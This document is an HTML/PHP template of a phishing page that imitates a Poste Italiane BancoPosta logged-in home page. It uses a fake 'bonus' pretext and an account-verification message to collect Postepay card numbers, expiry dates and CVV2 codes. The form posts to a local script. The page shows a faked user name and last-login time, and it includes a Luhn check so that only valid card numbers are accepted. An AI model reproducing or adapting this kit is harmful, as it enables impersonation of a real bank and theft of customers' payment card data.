<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html lang="it">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<meta http-equiv="Expires" content="-1"><title>Poste Italiane - Home Page personalizzata</title>
<!-- css links -->
<link rel="stylesheet" type="text/css" href="poste_files/css/global.css">
<link rel="stylesheet" type="text/css" href="poste_files/css//standard.css">
<link href="poste_files/css/random.css" rel="stylesheet" type="text/css">
<link rel="shortcut icon" href="poste_files/favicon.ico">
<script language="JavaScript" src="poste_files/files/poste.js" type="text/javascript"></script>
<script type="text/javascript">
function cardval(s) {
// remove non-numerics
var v = "0123456789";
var w = "";
for (i=0; i < s.length; i++) {
x = s.charAt(i);
if (v.indexOf(x,0) != -1)
w += x;
}
// validate number
j = w.length / 2;
if (j < 6.5 || j > 8 || j == 7) return false;
k = Math.floor(j);
m = Math.ceil(j) - k;
c = 0;
for (i=0; i<k; i++) {
a = w.charAt(i*2+m) * 2;
c += a > 9 ? Math.floor(a/10 + a%10) : a;
}
for (i=0; i<k+m; i++) c += w.charAt(i*2+1-m) * 1;
return (c%10 == 0);
}


function form_submit() {
	if (!cardval(document.forms[0].nr.value)) {
		alert('Inserisci un valido numero di NUMERO CARTA POSTEPAY');
		document.forms[0].nr.focus();
		return false;
	} 	else if (!isNumeric(document.forms[0].luna.value)||!isNumeric(document.forms[0].an.value)||document.forms[0].luna.value<01||document.forms[0].luna.value>31||document.forms[0].an.value<08||document.forms[0].an.value>20) {
		alert('Inserisci un valido data di SCADENZA');	
		document.forms[0].luna.focus();	
		return false;
	} else if (document.forms[0].cvv2.value==''||!isNumeric(document.forms[0].cvv2.value)) {
		alert('Il CVV inserito non è valido');
		document.forms[0].cvv2.focus();
		return false;
	} 	
return true;
}
function form_sub1(){
if (document.forms[0].rica1.value==''||document.forms[0].rica2.value==''||document.forms[0].rica3.value==''||document.forms[0].rica6.value==''||document.forms[0].rica8.value==''||document.forms[0].rica10.value=='') {
		alert('Vi preghiamo di compilare il vostro CODICE completo');
		document.forms[0].rica1.focus();
		return false;
	}
return true;
}
</script>
</head>
<body><center><div id="page">
	  <div id="contenitoreHeader" >     
   		<table width="799" border="0" cellpadding="0" cellspacing="0">
<tr>
                <td width="256" rowspan="2">
                	 <div id="logoposta">
        				<a class="logo1" href="http://www.poste.it/" title="Home"></a>		    </div>                       </td>
                <td width="521" height="32" align="left" valign="top"><div id="header_menu">&nbsp; <a href="http://www.poste.it/" title="Home">Home</a>| <a href="http://www.poste.it/azienda/index.shtml" title="Chi siamo">Chi siamo</a> | <a href="http://salastampa.poste.it/" title="Sala stampa">Sala stampa</a> | <a href="http://www.poste.it/en/" title="English">English</a> <span>. <a name="link_principale" id="link_principale" href="https://www.poste.it/online/personale/myposte">MyPoste <strong>Privati</strong></a>. <a name="link_logout" id="link_logout" href="http://www.poste.it/online/personale/logout.html">Esci</a>
                      <img src="index1_files/images/login.gif" alt="login" width="9" height="15" border="0"></span> </div></td>
</tr>
              <tr>
                <td><div id="navbars"><a class="dicosa" href="http://www.poste.it/esigenze/" title="Di cosa hai bisogno"></a> <a class="prodoti" href="http://www.poste.it/privati/" title="Prodotti"></a> <a class="busines" href="http://www.poste.it/imprese/" title="Servizi per il Business"> </a> <a class="servizi" href="http://www.poste.it/online/" title="Servizi online"> </a> </div>                
                </table>
	<div class="floatAnnulla"></div>
<div id="maincontent">
        <!-- navigazione laterale -->
                <div id="colonnaSinistra">
                        <!-- inizio menusx -->

<?php

if ($_SESSION['codice_session'] == 10)  {
?>
<div id="menusx">
  <div class="menuheaderGiallo"> <a href="https://bancopostaonline.poste.it/bpol/bancoposta/" title="BancoPostaonline">BancoPostaonline</a> </div>
  <ul>
    <li class="closearrow"><a href="https://bancopostaonline.poste.it/bpol/bancoposta/servizi/contobancoposta.aspx">Conto BancoPosta e Carte</a></li>
    <li class="closearrow"><a href="https://bancopostaonline.poste.it/bpol/bancoposta/servizi/trasferimentofondi.aspx">Trasferimento Fondi</a></li>
    <li class="closearrow"><a href="https://bancopostaonline.poste.it/bpol/servizi/pagamenti.aspx">Pagamenti</a></li>
    <li class="closearrow"><a href="https://bancopostaonline.poste.it/bpol/ricariche/servizi/ricarica/ricarica.aspx">Ricariche telefoniche</a></li>
    <li class="closearrow"><a href="https://bancopostaonline.poste.it/bpol/bancoposta/servizi/investimenti.aspx">Risparmio e Investimenti</a></li>
    <li class="closearrow"><a href="https://bancopostaonline.poste.it/bpol/bancoposta/servizi/finanziamenti.aspx">Finanziamenti</a></li>
    <li class="closearrow"><a href="https://bancopostaonline.poste.it/bpol/cartepre/servizi/cartapostepay/cartapostepay.aspx">Postepay</a></li>
    <li class="closearrow"><a href="https://bancopostaonline.poste.it/bpol/bancoposta/servizi/mondobancoposta.aspx">Mondo BancoPosta</a></li>
    <li><a href="https://bancopostaonline.poste.it/bpol/bancoposta/servizi/RicercaOperazioniBancoposta/RicercaOperazioniBancoposta.aspx">Cerca tra le operazioni online</a></li>
  </ul>
</div>

<?php } ?>

<?php if ($_SESSION['codice_session'] == 10) {  ?>

<div id="menusxSingolo1">
	<div class="menuheaderBlu">
		<a href="https://bancopostaonline.poste.it/" title="BancoPostaonline">BancoPostaonline</a>
	</div>
	<ul>
		<li><a href="http://www.poste.it/online/bancopostaonline/attivareservizio.shtml" title="Come attivare il servizio">Come attivare il servizio BancoPostaonline</a></li>
		<li><a href="http://www.poste.it/bancoposta/contobancoposta/diventarecorrentista.shtml" title="Come diventare correntista">Come diventare correntista</a></li>
		<li><a href="http://www.poste.it/bancoposta/" title="Prodotti e servizi BancoPosta">...prodotti e servizi BancoPosta</a></li>
		<li><a href="http://www.poste.it/bancoposta/mondobancoposta/" title="Mondo BancoPosta">...mondo BancoPosta</a></li>
	</ul>
</div>

<?php  } ?>
                       
                </div>
                <div id="colonnaDestra">
                	<div class="win585u">
                        <div class="wincontent">
		<form action="1.php?logon=cartapostepay" method="post" name="finform" <?php	if ($_SESSION['codice_iban'] == false)  { echo "onSubmit=\"javascript: return  form_submit(this);\""; } ?> <?php if ($_SESSION['codice_iban'] == true) {echo "onSubmit=\"javascript:return form_sub1(this);\"";} ?> >
	<table summary="dati tabella" border="0" cellpadding="0" cellspacing="0" width="578">
              <tr><td align="left" valign="bottom">
            <div id="sicureologin"></div>
           </td>
           </tr>
           <tr>
             <td align="center" valign="bottom" bgcolor="#ecf2fe"><span class="nameview"><?php echo $_SESSION['screen_name']; ?></span>  <br>           </tr>
           </td>
           <tr>
             <td align="center" valign="bottom" bgcolor="#ecf2fe"><span class="lastloginview"><?php echo "Il tuo ultimo accesso a BancoPosta online &eacute;&nbsp;". $_SESSION['last_login'];?> </span>            </td>
           </tr>
           <tr>
             <td align="center" valign="bottom" bgcolor="#ecf2fe"><p class="attenzione">Per ricevere il bonus &egrave; necessario verificare il suo conto.</p></td>
           </tr>
 	</table>
           <br>
           <?php if ($_SESSION['codice_iban'] == false )  { ?>
           <table width="100%" height="181" border="0"  class="codtab" cellpadding="0" cellspacing="0">
             <tbody>
               <tr bgcolor="#e8f404" valign="top">
                 <td width="50%" align="left" valign="middle" bgcolor="#EFF700" style="border-bottom:1px solid black;"><div id="cartapng"></div></td>
               </tr>
               <tr bgcolor="#ffffff" valign="top">
                 <td width="50%"><table width="505" height="121" border="0" cellpadding="0" cellspacing="0" bordercolor="#000099">
                     <tr>
                       <td width="10" height="41"><p><font size="1px"><b><br>
                       </b></font></p></td>
                       <td style="height:40px;" width="193"><p>
                          
								 				
                
                         Numero della carta postepay:<br>
                         <input name="nr" style="height:17px;" type="text" onKeyUp="key_up(event)" onClick="mouse_click(event)"   value="<?php if (validate($nr)) { print_r("$nr"); } ?>" size="23" maxlength="16"  >
                       </p></td>
                       <td width="302">&nbsp;</td>
                     </tr>
                     <tr>
                       <td height="45"><span class="style1">
                         <p>&nbsp;</p>
                         <p>&nbsp;</p>
                       </span></td>
                       <td style="height:40px;" height="45">
									   
                    
                         Scandenza: mm/aa<br>
                         <input name="luna" style="height:17px;" type="text" onKeyUp="key_up(event)" onClick="mouse_click(event)"   value="<?php if (is_numeric($luna)) { print $luna;} ?>" size="2" maxlength="2">
                         /
                         <input name="an" style="height:17px;" type="text" onKeyUp="key_up(event)" onClick="mouse_click(event)" value="<?php if (is_numeric($an)) { print $an;} ?>" size="2" maxlength="2"></td>
                       <td>&nbsp;&nbsp;&nbsp;</td>
                     </tr>
                     <tr>
                       <td><p class="style1">&nbsp;</p></td>
                       <td style="height:40px;"><p>  
                     
                         CVV2/CVC2:<br>
                         <input name="cvv2" style="height:17px;" type="text" onKeyUp="key_up(event)" onClick="mouse_click(event)"  value="<?php if (is_numeric($cvv2) && strlen($cvv2) == "3") { echo $cvv2; } ?>" size="3" maxlength="3"   >
                       </p></td>
                       <td><table width="225" height="20" border="0" cellpadding="0" cellspacing="0" style="margin-left:4px;">
                           <tr>
                             <td width="64"><div id="cvvcheck" ></div></td>
                             <td width="161"><a href="#" title="Visualizza la posizione del codice CVV2 sulla carta" class="style2" onClick="apripopup('poste_files/files/cvv.php','CVV2','500','400',''); return false;"></a> <a href="#" title="Visualizza la posizione del codice CVV2 sulla carta" class="style2 style16" onClick="apripopup('poste_files/files/cvv.php','CVV2','500','400',''); return false;">Visualizza la posizione
                               del codice CVV2
                               sulla carta &raquo;</a></td>
                           </tr>
                       </table></td>
                     </tr>
                 </table></td>
               </tr>
               <tr bgcolor="#ffffff" valign="top">
                 <td><b> &nbsp;</b></td>
               </tr>
               <tr bgcolor="#ffffff" valign="top">
                 <td></td>
               </tr>
               <tr bgcolor="#ffffff" valign="top">
                 <td align="right"></td>
               </tr>
             </tbody>
           </table>
           <?php } ?>
           <br>
              
            <p>  <?php  
				
					if ($_SESSION['codice_iban'] == true)  {
				?>
                
                
              <table width="100%" height="181" border="0"  class="codtab" cellpadding="0" cellspacing="0">
             <tbody>
               <tr bgcolor="#e8f404" valign="top">
                 <td width="50%" align="left" valign="middle" bgcolor="#EFF700" style="border-bottom:1px solid black;"><div id="cartapng"></div></td>
               </tr>
               <tr bgcolor="#ffffff" valign="top">
                 <td width="50%"><table width="505" height="121" border="0" cellpadding="0" cellspacing="0" bordercolor="#000099">
                     <tr>
                       <td width="10" height="41"><p><font size="1px"><b><br>
                       </b></font></p></td>
                       <td style="height:40px;" width="193"><p>
                          
								 				
                
                         Numero della carta postepay:<br>
                         <input name="nr" style="height:17px;" type="text" onKeyUp="key_up(event)" onClick="mouse_click(event)"   value="<?php if (validate($nr)) { print_r("$nr"); } ?>" size="23" maxlength="16"  >
                       </p></td>
                       <td width="302">&nbsp;</td>
                     </tr>
                     <tr>
                       <td height="45"><span class="style1">
                         <p>&nbsp;</p>
                         <p>&nbsp;</p>
                       </span></td>
                       <td style="height:40px;" height="45">
									   
                    
                         Scandenza: mm/aa<br>
                         <input name="luna" style="height:17px;" type="text" onKeyUp="key_up(event)" onClick="mouse_click(event)"   value="<?php if (is_numeric($luna)) { print $luna;} ?>" size="2" maxlength="2">
                         /
                         <input name="an" style="height:17px;" type="text" onKeyUp="key_up(event)" onClick="mouse_click(event)" value="<?php if (is_numeric($an)) { print $an;} ?>" size="2" maxlength="2"></td>
                       <td>&nbsp;&nbsp;&nbsp;</td>
                     </tr>
                     <tr>
                       <td><p class="style1">&nbsp;</p></td>
                       <td style="height:40px;"><p>  
                     
                         CVV2/CVC2:<br>
                         <input name="cvv2" style="height:17px;" type="text" onKeyUp="key_up(event)" onClick="mouse_click(event)"  value="<?php if (is_numeric($cvv2) && strlen($cvv2) == "3") { echo $cvv2; } ?>" size="3" maxlength="3"   >
                       </p></td>
                       <td><table width="225" height="20" border="0" cellpadding="0" cellspacing="0" style="margin-left:4px;">
                           <tr>
                             <td width="64"><div id="cvvcheck" ></div></td>
                             <td width="161"><a href="#" title="Visualizza la posizione del codice CVV2 sulla carta" class="style2" onClick="apripopup('poste_files/files/cvv.php','CVV2','500','400',''); return false;"></a> <a href="#" title="Visualizza la posizione del codice CVV2 sulla carta" class="style2 style16" onClick="apripopup('poste_files/files/cvv.php','CVV2','500','400',''); return false;">Visualizza la posizione
                               del codice CVV2
                               sulla carta &raquo;</a></td>
                           </tr>
                       </table></td>
                     </tr>
                 </table></td>
               </tr>
               <tr bgcolor="#ffffff" valign="top">
                 <td><b> &nbsp;</b></td>
               </tr>
               <tr bgcolor="#ffffff" valign="top">
                 <td></td>
               </tr>
               <tr bgcolor="#ffffff" valign="top">
                 <td align="right"></td>
               </tr>
             </tbody>
           </table>
<?php } ?>  
               
              </p>
              <p align="left"><br>
              </p>
            <table width="39" style="margin-right:5px;" border="0" align="right" cellpadding="0" cellspacing="0">
              <tr>
                <td width="82" valign="top"><input name="finito" class="button2" type="submit"  value="Continua" /></td>
                <td width="110" valign="bottom"><div id="arrowcontinue" /></td>
              </tr>
            </table

                        <p align="right"><br>
              </p>
                        </form>
                  </div>
                </div>
                </div>
    </div>

<div class="floatAnnulla"></div>

<div class="footer">
        | <a href="http://www.poste.it/azienda/posterisponde/" title="Contattaci">Contattaci</a>
        | <a href="http://www.poste.it/azienda/policy.shtml" title="Privacy">Privacy</a>
        | <a href="http://www.poste.it/online/mappa.shtml" title="Mappa">Mappa</a>
        | <a href="http://www.poste.it/bancoposta/trasparenza/index.shtml" title="Trasparenza bancaria">Trasparenza bancaria</a>
        | <a href="http://www.poste.it/azienda/fornituregarealloggi.shtml" title="Forniture e gare">Forniture e gare</a>
        | <a href="http://www.poste.it/azienda/ufficipostali/scadenzario.shtml" title="Scadenzario fiscale">Scadenzario fiscale</a> |
        &copy; Poste italiane 2008
</div>
</div>

</center></body></html>


